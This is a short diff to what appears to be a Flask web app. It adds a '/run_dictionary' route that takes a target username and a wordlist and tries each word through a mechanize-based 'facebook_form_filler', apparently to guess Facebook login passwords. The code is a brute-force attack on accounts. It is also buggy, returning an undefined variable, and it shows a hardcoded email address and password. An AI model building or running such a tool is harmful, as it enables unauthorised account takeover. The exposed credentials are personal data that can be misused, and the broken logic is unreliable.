@@ -68,7 +68,18 @@ def generate(username, charset, length, word):
 # methods for the dictionary algorithm
 @app.route('/run_dictionary', methods = ['POST', 'GET'])
 def dictionary_alg():
-    print("dictionary")
+    username = request.form["accusername"]
+    dictionaryChunk = request.form["dictionary"]
+    dictionary = dictionaryChunk.split()
+    for word in dictionary:
+        found = facebook_form_filler(username, word)
+        if found:
+            return password
+            break
+    if password != None:
+        return render_template('result.html',username = "tarabite@yahoo.com", password = "ggggggoo")
+    else:
+        return render_template('500_bf.html')
 
 def facebook_form_filler(email, password):
     br = mechanize.Browser()
